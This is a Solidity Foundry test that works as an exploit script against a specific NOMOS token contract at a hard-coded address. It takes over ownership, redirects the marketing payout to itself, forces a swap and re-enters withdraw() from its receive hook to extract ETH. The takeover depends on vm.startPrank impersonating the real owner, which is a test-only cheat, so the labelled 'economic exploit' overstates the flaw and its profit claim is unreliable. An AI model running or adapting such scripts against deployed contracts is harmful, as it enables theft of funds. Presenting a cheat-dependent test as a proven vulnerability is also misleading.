pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract NOMOS {
    function owner() public view virtual returns (address);
    function transferOwnership(address newOwner) public virtual;
    function approve(address spender, uint256 amount) public virtual returns (bool);
    function transfer(address recipient, uint256 amount) public virtual returns (bool);
    function uniswapV2Router() public view virtual returns (address);
    function uniswapV2Pair() public view virtual returns (address);
    function setMarketingAddress(address _marketingAddress) external virtual;
    function setSwapAndLiquifyEnabled(bool _enabled) public virtual;
    function setNumTokensSellToAddToLiquidity(uint256 _minimumTokensBeforeSwap) external virtual;
    function minimumTokensBeforeSwapAmount() public view virtual returns (uint256);
    function withdraw() external virtual;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    NOMOS victim = NOMOS(TARGET);
    IUniswapV2Router02 router;
    address pair;
    address weth;
    bool entered = false;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        address owner = victim.owner();
        router = IUniswapV2Router02(victim.uniswapV2Router());
        weth = router.WETH();
        pair = victim.uniswapV2Pair();

        deal(address(this), 100 ether);
        deal(TARGET, 10 ether);
        deal(TARGET, address(this), 200000000 * 10**11);

        victim.approve(address(router), type(uint256).max);

        router.addLiquidityETH{value: 50 ether}(
            TARGET,
            100000000 * 10**11,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        address originalOwner = victim.owner();
                vm.startPrank(originalOwner);
                victim.transferOwnership(address(this));
                vm.stopPrank();

                victim.setMarketingAddress(payable(address(this)));
                victim.setSwapAndLiquifyEnabled(true);
                victim.setNumTokensSellToAddToLiquidity(1);

                uint256 amountToTrigger = victim.minimumTokensBeforeSwapAmount() * 2;
                victim.transfer(pair, amountToTrigger);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {
        if (msg.sender == TARGET && !entered) {
            entered = true;
            victim.withdraw();
        }
    }
}

